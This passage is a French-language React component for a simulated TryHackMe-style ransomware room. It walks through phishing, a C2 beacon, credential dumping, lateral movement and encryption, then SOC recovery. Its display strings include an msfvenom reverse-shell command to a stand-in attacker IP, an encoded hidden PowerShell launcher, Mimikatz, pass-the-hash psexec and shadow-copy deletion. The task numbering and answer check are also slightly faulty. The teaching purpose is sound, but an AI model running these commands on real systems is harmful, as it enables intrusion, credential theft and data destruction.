import React, { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Play,
  RotateCcw,
  CheckCircle2,
  AlertTriangle,
  Terminal,
  ShieldCheck,
  Server,
  Laptop,
  User,
  Skull,
  Lock,
  Unlock,
  Key,
  Network,
  HelpCircle,
  Radio,
  Zap,
  Sparkles,
  Award,
  Clock,
  Send,
  ArrowRight,
  ArrowLeft,
  Eye,
  Info,
  Layers,
  ChevronRight,
  ShieldAlert,
} from 'lucide-react'
import { sound } from '../utils/audio'
import { narrator } from '../utils/voice'

interface TaskData {
  id: number
  title: string
  subtitle: string
  role: 'attacker' | 'victim' | 'system' | 'defender'
  theory: string
  commandExecuted: string
  commandOutput: string[]
  question: string
  answer: string
  hint: string
  activeSource: string
  activeTarget: string
  statusUpdate: { [key: string]: string }
  voiceSummary: string
}

export default function TryHackMeLab() {
  // Machine Virtuelle Simulée TryHackMe
  const [machineStarted, setMachineStarted] = useState<boolean>(true)
  const [sessionTime, setSessionTime] = useState<number>(1500) // 25 min en secondes
  const [targetIP] = useState<string>('10.10.142.50')

  // Tâche active dans la room (0 à 5)
  const [activeTaskId, setActiveTaskId] = useState<number>(0)

  // Progression & Récompenses TryHackMe
  const [completedTasks, setCompletedTasks] = useState<{ [key: number]: boolean }>({})
  const [xpPoints, setXpPoints] = useState<number>(0)

  // État de l'animation d'exécution manuelle
  const [isExecuting, setIsExecuting] = useState<boolean>(false)
  const [lastExecutedTask, setLastExecutedTask] = useState<number | null>(null)

  // Champ de réponse TryHackMe
  const [userAnswer, setUserAnswer] = useState<string>('')
  const [answerFeedback, setAnswerFeedback] = useState<'correct' | 'wrong' | null>(null)
  const [showHint, setShowHint] = useState<boolean>(false)

  // États dynamiques de chaque équipement de la topologie
  const [nodeStatuses, setNodeStatuses] = useState<{ [key: string]: string }>({
    hacker: 'Prêt (Kali Linux)',
    sophie: 'Actif (Windows 11)',
    firewall: 'Filtrage Standard',
    dc01: 'AD Sain (Kerberos)',
    srvFile: 'Partage SMB Normal',
    marc: 'En veille (Console SOC)',
    airgap: 'Coffre Immuable Clos',
  })

  // Minuteur de machine virtuelle
  useEffect(() => {
    if (!machineStarted) return
    const timer = setInterval(() => {
      setSessionTime((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(timer)
  }, [machineStarted])

  const formatTimer = (secs: number) => {
    const m = Math.floor(secs / 60)
    const s = secs % 60
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`
  }

  // LES 6 TÂCHES TRYHACKME AVEC DÉROULÉ TECHNIQUE RÉEL
  const tasks: TaskData[] = [
    {
      id: 0,
      title: 'Tâche 1 : Reconnaissance & Livraison Hameçonnage',
      subtitle: 'Infiltration par ingénierie sociale ciblée vers les RH',
      role: 'attacker',
      theory:
        'L\'attaquant élabore un courriel d\'hameçonnage ciblé (Spear Phishing) usurpant la Direction des Ressources Humaines. Le courriel contient une pièce jointe Word piégée avec une macro VBA masquée (Grille_Salaires_2026.docm). Lorsque l\'employée Sophie ouvre le document et active le contenu, la macro prépare l\'exécution silencieuse.',
      commandExecuted:
        'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=198.51.100.89 LPORT=443 -f vba -o payload.vba',
      commandOutput: [
        '[*] Payload generated: windows/x64/meterpreter/reverse_https',
        '[*] Obfuscating VBA macro with base64 polymorphic wrapper...',
        '[+] Weaponized document saved to /tmp/Grille_Salaires_2026.docm',
        '[*] Sending SMTP spear-phishing to sophie.martin@meridian.corp...',
        '[+] 250 2.0.0 Message accepted for delivery by mail gateway.',
      ],
      question: 'Quel est le format du document Word contenant la macro d\'attaque ?',
      answer: '.docm',
      hint: 'Regardez l\'extension du fichier mentionné dans la théorie ou les logs (.docm).',
      activeSource: 'hacker',
      activeTarget: 'sophie',
      statusUpdate: {
        hacker: 'Envoi Hameçonnage',
        sophie: 'Email Reçu & Clic Macro !',
      },
      voiceSummary:
        'Tâche 1 : L\'attaquant envoie un courriel piégé avec une macro malveillante à Sophie. En cliquant, elle autorise l\'exécution du script.',
    },
    {
      id: 1,
      title: 'Tâche 2 : Compromission Initiale & Balise C2 Furtive',
      subtitle: 'Établissement du canal de commandement et contrôle sortant',
      role: 'attacker',
      theory:
        'La macro VBA exécute PowerShell en mémoire sans toucher au disque. Une balise de commande (C2 Beacon) initie une connexion HTTPS chiffrée sortante vers le serveur Kali de l\'attaquant. Comme le trafic passe par le port standard 443 et ressemble à une navigation web classique, le pare-feu laisse passer le flux sans bloquer.',
      commandExecuted:
        'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...',
      commandOutput: [
        '[*] Started HTTPS reverse handler on 198.51.100.89:443',
        '[*] Incoming HTTPS connection from 192.168.10.14 (PC-RH-01)...',
        '[*] Meterpreter session 1 opened (198.51.100.89:443 -> 192.168.10.14:52104)',
        'meterpreter > sysinfo',
        'Computer        : PC-RH-01',
        'OS              : Windows 11 Enterprise (Build 22621)',
        'Logged On Users : 1 (MERIDIAN\\smartin)',
      ],
      question: 'Quel port réseau standard est utilisé pour masquer la communication avec le pirate ?',
      answer: '443',
      hint: 'C\'est le port utilisé par HTTPS pour le web sécurisé (trois chiffres).',
      activeSource: 'sophie',
      activeTarget: 'hacker',
      statusUpdate: {
        sophie: 'Compromis (Balise C2 active)',
        firewall: 'Trafic HTTPS 443 autorisé',
        hacker: 'Session C2 Établie (Session 1)',
      },
      voiceSummary:
        'Tâche 2 : Une connexion sortante HTTPS est établie sur le port 443. Le pirate prend le contrôle à distance du poste de travail.',
    },
    {
      id: 3,
      title: 'Tâche 3 : Élévation de Privilèges & Dump LSASS',
      subtitle: 'Extraction des mots de passe en mémoire vive',
      role: 'attacker',
      theory:
        'Avec sa session utilisateur classique, l\'attaquant a des droits limités. Il utilise Mimikatz pour injecter du code dans le processus système Local Security Authority Subsystem Service (lsass.exe). Ce composant stocke les tickets Kerberos et empreintes NT des comptes récemment connectés, révélant ainsi les identifiants de l\'Administrateur du Domaine !',
      commandExecuted:
        'privilege::debug; sekurlsa::logonpasswords',
      commandOutput: [
        'mimikatz # privilege::debug',
        'Privilege \'20\' OK',
        'mimikatz # sekurlsa::logonpasswords',
        'Authentication Id : 0 ; 997 (00000000:000003e5)',
        'Session           : Interactive from 0',
        'User Name         : DA_admin',
        'Domain            : MERIDIAN',
        '[*] NTLM Hash     : 8846f7eaee8fb117ad06bdd830b7586c (Admin Domaine capturé !)',
      ],
      question: 'Quel processus Windows crucial en mémoire est ciblé pour dérober les mots de passe ?',
      answer: 'lsass.exe',
      hint: 'Le nom du processus commence par "ls" et se termine par ".exe".',
      activeSource: 'sophie',
      activeTarget: 'dc01',
      statusUpdate: {
        sophie: 'Mimikatz Injecté (Admin Volé)',
        dc01: 'Identifiants Admin Capturés !',
      },
      voiceSummary:
        'Tâche 3 : L\'attaquant extrait de la mémoire vive les accès administrateur en ciblant le processus LSASS.',
    },
    {
      id: 4,
      title: 'Tâche 4 : Mouvement Latéral & Rebond SMB',
      subtitle: 'Pivoting vers le serveur de fichiers et bases de données',
      role: 'attacker',
      theory:
        'Muni du hash NTLM de l\'administrateur, le pirate n\'a même pas besoin de casser le mot de passe : il pratique l\'attaque Pass-The-Hash via le protocole SMB (port 445). Il fait rebondir son outil PsExec depuis le PC de Sophie vers le serveur de fichiers critique de l\'entreprise (SRV-FILE-01) pour y déposer la charge finale.',
      commandExecuted:
        'psexec.py MERIDIAN/DA_admin@192.168.10.20 -hashes :8846f7eaee8fb117ad06bdd830b7586c "cmd.exe"',
      commandOutput: [
        '[*] Requesting shares on 192.168.10.20...',
        '[+] Found writable share ADMIN$',
        '[*] Uploading payload to \\\\192.168.10.20\\ADMIN$\\update_service.exe',
        '[*] Created service B481 on 192.168.10.20',
        '[*] Starting service...',
        '[+] Shell obtained on SRV-FILE-01 (NT AUTHORITY\\SYSTEM)',
      ],
      question: 'Quel protocole réseau Windows (port 445) permet le mouvement latéral entre machines ?',
      answer: 'SMB',
      hint: 'Acronyme de 3 lettres : Server Message Block.',
      activeSource: 'sophie',
      activeTarget: 'srvFile',
      statusUpdate: {
        dc01: 'Rebond Validé',
        srvFile: 'Infiltré (Accès SYSTEM)',
      },
      voiceSummary:
        'Tâche 4 : Rebond SMB vers le serveur central. Le pirate prend le contrôle total du stockage de données de l\'entreprise.',
    },
    {
      id: 5,
      title: 'Tâche 5 : Déploiement Rançongiciel LockBit & Chantage',
      subtitle: 'Verrouillage mathématique des 420 Go et note de rançon',
      role: 'system',
      theory:
        'Le malware LockBit 3.0 s\'exécute avec les privilèges les plus élevés. En quelques dizaines de secondes, il supprime les clichés instantanés locaux de Windows (Volume Shadow Copies) avec la commande vssadmin pour empêcher une restauration facile, puis chiffre 420 Go de contrats, bases SQL et plans confidentiels avec l\'algorithme AES-256 + RSA-4096.',
      commandExecuted:
        'vssadmin.exe delete shadows /all /quiet & lockbit.exe -path \\\\SRV-FILE-01\\Data',
      commandOutput: [
        '[*] Successfully deleted 4 Volume Shadow Copies (vssadmin)',
        '[*] Thread count: 32 threads started',
        '[*] Encrypting files: 89,450 files encrypted (.lockbit)',
        '[!] Dropping ransom note: RESTORE-MY-FILES.txt',
        '====================================================',
        'ALL YOUR FILES AND DATABASES ARE ENCRYPTED.',
        'TO RESTORE YOUR DATA, PAY 15 BITCOINS TO: bc1qxy2...',
        '====================================================',
      ],
      question: 'Combien de Bitcoins sont exigés par les attaquants dans la note de rançon ?',
      answer: '15',
      hint: 'Regardez le chiffre écrit dans la note de rançon en rouge (15).',
      activeSource: 'srvFile',
      activeTarget: 'srvFile',
      statusUpdate: {
        srvFile: '420 Go Chiffrés (LOCKBIT)',
      },
      voiceSummary:
        'Tâche 5 : Le rançongiciel verrouille tous les fichiers du serveur et réclame 15 Bitcoins sous peine de divulgation.',
    },
    {
      id: 6,
      title: 'Tâche 6 : Riposte SOC, Confinement & Restauration Air-Gap',
      subtitle: 'Intervention du défenseur et reprise sans payer de rançon',
      role: 'defender',
      theory:
        'L\'analyste SOC Marc intervient immédiatement : il isole le PC compromis de Sophie via l\'EDR (coupure réseau logique) pour stopper toute propagation. Ensuite, au lieu de céder au chantage des pirates, l\'équipe de crise déclenche la restauration des 420 Go depuis le coffre immuable Veeam v12 physiquement isolé (Air-Gap). L\'entreprise repart saine et sauve !',
      commandExecuted:
        'Invoke-EDRIsolateHost -ComputerName PC-RH-01; Start-VeeamRestoreJob -Backup "SECURE_AIRGAP_DAILY"',
      commandOutput: [
        '[+] [EDR AGENT] Network isolation applied to PC-RH-01 (192.168.10.14)',
        '[*] Kill process PID 4912 (powershell.exe) - Terminated',
        '[+] Air-Gap secure channel opened to 192.168.99.10',
        '[*] Validating immutable snapshot integrity: 100% Verified (Zero tampering)',
        '[+] Restoring 420 GB to clean SRV-FILE-01...',
        '[+] RESTORATION COMPLETE: 89,450 clean files restored. Zero ransom paid!',
      ],
      question: 'Quel type de sauvegarde étanche et inviolable permet de restaurer sans payer la rançon ?',
      answer: 'Air-Gap',
      hint: 'Deux mots reliés par un tiret signifiant l\'isolation physique (Air-Gap ou Immuable).',
      activeSource: 'marc',
      activeTarget: 'airgap',
      statusUpdate: {
        sophie: 'Isolée du réseau (Câble coupé)',
        srvFile: 'Restauré à 100% (Sain)',
        marc: 'Incident Maîtrisé !',
        airgap: 'Sauvegarde Certifiée',
      },
      voiceSummary:
        'Tâche 6 : Riposte et victoire ! Le poste infecté est confiné et les données sont intégralement restaurées depuis le coffre Air-Gap.',
    },
  ]

  const currentTask = tasks[activeTaskId]

  // Déclencher l'exécution manuelle de l'étape
  const handleExecuteStep = () => {
    sound.playLaser()
    setIsExecuting(true)
    narrator.speak(currentTask.voiceSummary)

    // Mise à jour visuelle des statuts
    setTimeout(() => {
      setNodeStatuses((prev) => ({
        ...prev,
        ...currentTask.statusUpdate,
      }))
      setIsExecuting(false)
      setLastExecutedTask(currentTask.id)
      sound.playSuccess()
    }, 2500)
  }

  // Valider le flag de la tâche TryHackMe
  const handleValidateAnswer = () => {
    const cleanUser = userAnswer.trim().toLowerCase()
    const cleanTarget = currentTask.answer.trim().toLowerCase()

    if (
      cleanUser === cleanTarget ||
      cleanUser.includes(cleanTarget) ||
      cleanTarget.includes(cleanUser)
    ) {
      sound.playSuccess()
      setAnswerFeedback('correct')
      if (!completedTasks[currentTask.id]) {
        setCompletedTasks((prev) => ({ ...prev, [currentTask.id]: true }))
        setXpPoints((prev) => prev + 100)
      }
    } else {
      sound.playError()
      setAnswerFeedback('wrong')
    }
  }

  const handleNextTask = () => {
    sound.playClick()
    if (activeTaskId < tasks.length - 1) {
      setActiveTaskId((prev) => prev + 1)
      setUserAnswer('')
      setAnswerFeedback(null)
      setShowHint(false)
    }
  }

  const handlePrevTask = () => {
    sound.playClick()
    if (activeTaskId > 0) {
      setActiveTaskId((prev) => prev - 1)
      setUserAnswer('')
      setAnswerFeedback(null)
      setShowHint(false)
    }
  }

  const handleResetLab = () => {
    sound.playLaser()
    setActiveTaskId(0)
    setCompletedTasks({})
    setXpPoints(0)
    setUserAnswer('')
    setAnswerFeedback(null)
    setShowHint(false)
    setNodeStatuses({
      hacker: 'Prêt (Kali Linux)',
      sophie: 'Actif (Windows 11)',
      firewall: 'Filtrage Standard',
      dc01: 'AD Sain (Kerberos)',
      srvFile: 'Partage SMB Normal',
      marc: 'En veille (Console SOC)',
      airgap: 'Coffre Immuable Clos',
    })
  }

  const totalCompleted = Object.keys(completedTasks).length
  const progressPercent = Math.round((totalCompleted / tasks.length) * 100)

  return (
    <div className="max-w-7xl mx-auto px-4 py-6 font-sans text-slate-100 select-none">
      {/* 1. HERO BANNER STYLE TRYHACKME AVEC L'IMAGE GEMINI */}
      <div className="relative rounded-3xl overflow-hidden border border-slate-800 shadow-2xl mb-8 bg-slate-950">
        <div className="h-44 sm:h-56 md:h-64 w-full relative">
          <img
            src="/tryhackme_room_banner.jpg"
            alt="TryHackMe Style Cyber Lab Banner"
            className="w-full h-full object-cover object-center opacity-40 mix-blend-luminosity"
          />
          <div className="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/70 to-transparent" />
        </div>

        {/* Informations de la Room en surimpression */}
        <div className="absolute bottom-4 left-6 right-6 flex flex-col sm:flex-row items-start sm:items-end justify-between gap-4">
          <div>
            <div className="flex flex-wrap items-center gap-2 mb-2">
              <span className="px-2.5 py-0.5 rounded-md bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[11px] font-mono font-bold uppercase tracking-wider">
                TRYHACKME ROOM LAB
              </span>
              <span className="px-2.5 py-0.5 rounded-md bg-blue-500/20 text-blue-300 border border-blue-500/40 text-[11px] font-mono font-bold">
                DIFFICULTÉ : MOYEN
              </span>
              <span className="px-2.5 py-0.5 rounded-md bg-purple-500/20 text-purple-300 border border-purple-500/40 text-[11px] font-mono font-bold">
                INCIDENT RESPONSE
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl md:text-3xl font-black text-white tracking-tight">
              Opération DarkLock : Simulation Pratique & Réponse à Incident
            </h1>
            <p className="text-xs text-slate-400 mt-1 max-w-2xl">
              Exécutez manuellement chaque étape de l'attaque cyber, observez les flux en direct entre les personnages et les serveurs, puis validez les flags pour triompher du lab.
            </p>
          </div>

          {/* Statut Machine Virtuelle & Timer */}
          <div className="flex items-center gap-3 bg-slate-900/90 border border-slate-800 p-2.5 rounded-2xl shadow-lg backdrop-blur-sm">
            <div className="text-right font-mono">
              <span className="text-[10px] text-slate-500 block uppercase">Cible Active</span>
              <span className="text-xs text-emerald-400 font-bold flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                {targetIP}
              </span>
            </div>

            <div className="h-7 w-px bg-slate-800" />

            <div className="text-right font-mono">
              <span className="text-[10px] text-slate-500 block uppercase">Temps Restant</span>
              <span className="text-xs text-amber-400 font-bold flex items-center gap-1">
                <Clock size={12} />
                {formatTimer(sessionTime)}
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* 2. BARRE DE PROGRESSION & SCORE TRYHACKME */}
      <div className="p-4 rounded-2xl bg-slate-900/90 border border-slate-800 mb-8 flex flex-col md:flex-row items-center justify-between gap-4 shadow-xl">
        <div className="flex items-center gap-4 w-full md:w-auto">
          <div className="w-12 h-12 rounded-2xl bg-blue-600/20 text-blue-400 border border-blue-500/40 flex items-center justify-center font-black text-lg">
            <Award size={24} />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-sm font-bold text-white">Progression de la Salle</span>
              <span className="text-xs font-mono font-bold text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded-md border border-emerald-500/40">
                {progressPercent}%
              </span>
            </div>
            <span className="text-xs text-slate-400">
              {totalCompleted} / {tasks.length} Tâches validées · Score : {xpPoints} / 600 XP
            </span>
          </div>
        </div>

        {/* Barre de progression visuelle */}
        <div className="flex-1 max-w-md w-full bg-slate-950 h-3 rounded-full overflow-hidden border border-slate-800 relative">
          <motion.div
            className="h-full bg-gradient-to-r from-blue-600 via-indigo-500 to-emerald-500 rounded-full"
            initial={{ width: 0 }}
            animate={{ width: `${progressPercent}%` }}
            transition={{ duration: 0.5 }}
          />
        </div>

        {/* Contrôles du Lab */}
        <div className="flex items-center gap-2">
          <button
            onClick={handleResetLab}
            className="px-3 py-1.5 rounded-xl bg-slate-950 hover:bg-slate-800 border border-slate-800 text-slate-400 hover:text-white text-xs font-mono flex items-center gap-1.5 transition"
            title="Réinitialiser tous les drapeaux et statuts"
          >
            <RotateCcw size={13} />
            <span>Réinitialiser</span>
          </button>
        </div>
      </div>

      {/* 3. DISPOSITION PRINCIPALE SPLIT-SCREEN STYLE TRYHACKME */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* COLONNE GAUCHE (7 COLONNES) : TOPOLOGIE RÉSEAU ANIMÉE EN TEMPS RÉEL AVEC PERSONNAGES & SERVEURS */}
        <div className="lg:col-span-7 space-y-4">
          <div className="p-5 rounded-3xl bg-slate-900 border border-slate-800 shadow-2xl relative overflow-hidden">
            <div className="flex items-center justify-between pb-3 mb-4 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-blue-500 animate-ping" />
                <h3 className="text-xs font-mono font-bold text-slate-300 uppercase tracking-wider">
                  Topologie Interactive : Personnages, Postes & Serveurs
                </h3>
              </div>
              <span className="text-[11px] font-mono text-slate-500">
                Liaisons WAN / LAN / DMZ
              </span>
            </div>

            {/* GRILLE TOPOLOGIQUE DES ACTEURS ET ÉQUIPEMENTS */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 relative">
              {/* 1. PERSONNAGE 1 : L'ATTAQUANT (Shadow APT - Kali Linux) */}
              <div
                className={`p-4 rounded-2xl border transition-all relative ${
                  currentTask.activeSource === 'hacker' || currentTask.activeTarget === 'hacker'
                    ? 'bg-rose-950/30 border-rose-500 ring-2 ring-rose-500/40 shadow-xl'
                    : 'bg-slate-950/80 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-xl bg-rose-600/20 text-rose-400 border border-rose-500/40">
                      <Skull size={22} />
                    </div>
                    <div>
                      <span className="text-xs font-bold text-white block">Attaquant (Shadow APT)</span>
                      <span className="text-[10px] font-mono text-slate-400">198.51.100.89 · Kali Linux</span>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-rose-950 border border-rose-800 text-rose-300">
                    WAN Extérieur
                  </span>
                </div>
                <div className="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px]">
                  <span className="text-slate-500 font-mono">Statut :</span>
                  <span className="font-mono font-bold text-rose-400">{nodeStatuses.hacker}</span>
                </div>
              </div>

              {/* 2. ÉQUIPEMENT 2 : PARE-FEU D'ENTREPRISE (Border Gateway) */}
              <div
                className={`p-4 rounded-2xl border transition-all ${
                  currentTask.activeTarget === 'firewall'
                    ? 'bg-amber-950/30 border-amber-500 ring-2 ring-amber-500/40'
                    : 'bg-slate-950/80 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-xl bg-amber-600/20 text-amber-400 border border-amber-500/40">
                      <ShieldAlert size={22} />
                    </div>
                    <div>
                      <span className="text-xs font-bold text-white block">Pare-feu d'Entreprise</span>
                      <span className="text-[10px] font-mono text-slate-400">192.168.10.1 · FW-BORDER</span>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-amber-950 border border-amber-800 text-amber-300">
                    Passerelle
                  </span>
                </div>
                <div className="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px]">
                  <span className="text-slate-500 font-mono">Statut :</span>
                  <span className="font-mono font-bold text-amber-300">{nodeStatuses.firewall}</span>
                </div>
              </div>

              {/* 3. PERSONNAGE 3 : SOPHIE RH (Poste de Travail PC-RH-01) */}
              <div
                className={`p-4 rounded-2xl border transition-all ${
                  currentTask.activeSource === 'sophie' || currentTask.activeTarget === 'sophie'
                    ? 'bg-blue-950/40 border-blue-500 ring-2 ring-blue-500/40 shadow-xl'
                    : 'bg-slate-950/80 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-xl bg-blue-600/20 text-blue-400 border border-blue-500/40">
                      <User size={22} />
                    </div>
                    <div>
                      <span className="text-xs font-bold text-white block">Sophie (RH / Victime)</span>
                      <span className="text-[10px] font-mono text-slate-400">192.168.10.14 · PC-RH-01</span>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-blue-950 border border-blue-800 text-blue-300">
                    LAN Bureautique
                  </span>
                </div>
                <div className="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px]">
                  <span className="text-slate-500 font-mono">Statut :</span>
                  <span className="font-mono font-bold text-blue-300">{nodeStatuses.sophie}</span>
                </div>
              </div>

              {/* 4. ÉQUIPEMENT 4 : CONTRÔLEUR ACTIVE DIRECTORY (DC01) */}
              <div
                className={`p-4 rounded-2xl border transition-all ${
                  currentTask.activeTarget === 'dc01'
                    ? 'bg-purple-950/40 border-purple-500 ring-2 ring-purple-500/40 shadow-xl'
                    : 'bg-slate-950/80 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-xl bg-purple-600/20 text-purple-400 border border-purple-500/40">
                      <Key size={22} />
                    </div>
                    <div>
                      <span className="text-xs font-bold text-white block">Contrôleur de Domaine (DC01)</span>
                      <span className="text-[10px] font-mono text-slate-400">192.168.10.2 · Active Directory</span>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-purple-950 border border-purple-800 text-purple-300">
                    Cœur Identités
                  </span>
                </div>
                <div className="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px]">
                  <span className="text-slate-500 font-mono">Statut :</span>
                  <span className="font-mono font-bold text-purple-300">{nodeStatuses.dc01}</span>
                </div>
              </div>

              {/* 5. ÉQUIPEMENT 5 : SERVEUR DE FICHIERS PARTAGÉS (SRV-FILE-01) */}
              <div
                className={`p-4 rounded-2xl border transition-all ${
                  currentTask.activeTarget === 'srvFile'
                    ? 'bg-red-950/40 border-red-500 ring-2 ring-red-500/40 shadow-xl'
                    : 'bg-slate-950/80 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-xl bg-red-600/20 text-red-400 border border-red-500/40">
                      <Server size={22} />
                    </div>
                    <div>
                      <span className="text-xs font-bold text-white block">Serveur Fichiers & SQL</span>
                      <span className="text-[10px] font-mono text-slate-400">192.168.10.20 · SRV-FILE-01</span>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-red-950 border border-red-800 text-red-300">
                    Stockage Critique
                  </span>
                </div>
                <div className="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px]">
                  <span className="text-slate-500 font-mono">Statut :</span>
                  <span className="font-mono font-bold text-red-300">{nodeStatuses.srvFile}</span>
                </div>
              </div>

              {/* 6. PERSONNAGE 6 : MARC (Analyste SOC / Défenseur) */}
              <div
                className={`p-4 rounded-2xl border transition-all ${
                  currentTask.activeSource === 'marc'
                    ? 'bg-emerald-950/40 border-emerald-500 ring-2 ring-emerald-500/40 shadow-xl'
                    : 'bg-slate-950/80 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-xl bg-emerald-600/20 text-emerald-400 border border-emerald-500/40">
                      <ShieldCheck size={22} />
                    </div>
                    <div>
                      <span className="text-xs font-bold text-white block">Marc (Analyste SOC)</span>
                      <span className="text-[10px] font-mono text-slate-400">Console EDR · Réponse Crise</span>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-emerald-950 border border-emerald-800 text-emerald-300">
                    Défenseur
                  </span>
                </div>
                <div className="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px]">
                  <span className="text-slate-500 font-mono">Statut :</span>
                  <span className="font-mono font-bold text-emerald-300">{nodeStatuses.marc}</span>
                </div>
              </div>
            </div>

            {/* 7. COFFRE HORS-LIGNE AIR-GAP VEEAM (Au bas du réseau) */}
            <div
              className={`mt-4 p-3.5 rounded-2xl border transition-all flex items-center justify-between ${
                currentTask.activeTarget === 'airgap'
                  ? 'bg-emerald-950/50 border-emerald-400 ring-2 ring-emerald-400 shadow-xl'
                  : 'bg-slate-950/90 border-slate-800'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-xl bg-emerald-600/20 text-emerald-400 border border-emerald-500/40">
                  <Lock size={18} />
                </div>
                <div>
                  <span className="text-xs font-bold text-white block">
                    Coffre de Sauvegarde Immuable Air-Gap (Veeam v12)
                  </span>
                  <span className="text-[10px] font-mono text-slate-400">
                    192.168.99.10 · Hors-ligne physique étanche
                  </span>
                </div>
              </div>
              <span className="text-xs font-mono font-bold text-emerald-400">
                {nodeStatuses.airgap}
              </span>
            </div>

            {/* Animation de faisceau d'exécution en cours */}
            {isExecuting && (
              <div className="absolute inset-0 bg-blue-950/60 backdrop-blur-[2px] flex flex-col items-center justify-center p-6 z-20">
                <span className="w-12 h-12 rounded-full border-4 border-blue-500 border-t-transparent animate-spin mb-3" />
                <span className="text-sm font-bold text-white font-mono animate-pulse">
                  Exécution du flux réseau en cours...
                </span>
                <span className="text-xs text-blue-300 mt-1 font-mono">
                  {currentTask.activeSource.toUpperCase()} ➔ {currentTask.activeTarget.toUpperCase()}
                </span>
              </div>
            )}
          </div>

          {/* TERMINAL EN DIRECT DES COMMANDES EXÉCUTÉES (Style TryHackMe) */}
          <div className="rounded-3xl bg-slate-950 border border-slate-800 p-4 font-mono shadow-xl">
            <div className="flex items-center justify-between pb-2 mb-3 border-b border-slate-800 text-xs">
              <div className="flex items-center gap-2 text-slate-400">
                <Terminal size={14} className="text-emerald-400" />
                <span className="font-bold text-white">Console / Logs Réseau Simulés</span>
              </div>
              <span className="text-[10px] text-slate-500">
                Commande active : Tâche #{currentTask.id + 1}
              </span>
            </div>

            <div className="bg-black/90 p-3.5 rounded-xl border border-slate-800/80 text-[11px] leading-relaxed text-slate-300 space-y-1 overflow-x-auto">
              <div className="text-emerald-400 font-bold flex items-center gap-1.5">
                <span>$</span>
                <span>{currentTask.commandExecuted}</span>
              </div>
              <div className="pt-2 text-slate-400 space-y-0.5">
                {currentTask.commandOutput.map((line, i) => (
                  <div
                    key={i}
                    className={
                      line.includes('[+]')
                        ? 'text-emerald-400'
                        : line.includes('[!]') || line.includes('ENCRYPTED')
                        ? 'text-red-400 font-bold'
                        : line.includes('[*]')
                        ? 'text-sky-400'
                        : 'text-slate-400'
                    }
                  >
                    {line}
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* COLONNE DROITE (5 COLONNES) : LE PANNEAU DE TÂCHE TRYHACKME AVEC OBJECTIFS & QUESTION DE FLAG */}
        <div className="lg:col-span-5 space-y-4">
          <div className="p-6 rounded-3xl bg-slate-900 border border-slate-800 shadow-2xl">
            {/* Navigation rapide entre les tâches */}
            <div className="flex items-center justify-between pb-4 mb-4 border-b border-slate-800">
              <span className="text-xs font-mono font-bold text-blue-400 uppercase tracking-wider">
                Tâche {currentTask.id + 1} sur {tasks.length}
              </span>

              <div className="flex items-center gap-1.5">
                <button
                  onClick={handlePrevTask}
                  disabled={activeTaskId === 0}
                  className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 disabled:opacity-30 text-slate-300"
                  title="Tâche précédente"
                >
                  <ArrowLeft size={14} />
                </button>
                <span className="text-xs font-mono px-2 text-slate-400">
                  {activeTaskId + 1} / {tasks.length}
                </span>
                <button
                  onClick={handleNextTask}
                  disabled={activeTaskId === tasks.length - 1}
                  className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 disabled:opacity-30 text-slate-300"
                  title="Tâche suivante"
                >
                  <ArrowRight size={14} />
                </button>
              </div>
            </div>

            {/* Titre & Rôle de la Tâche */}
            <div className="mb-4">
              <h2 className="text-lg font-black text-white leading-snug">{currentTask.title}</h2>
              <p className="text-xs text-slate-400 mt-1">{currentTask.subtitle}</p>
            </div>

            {/* Explications Théoriques TryHackMe */}
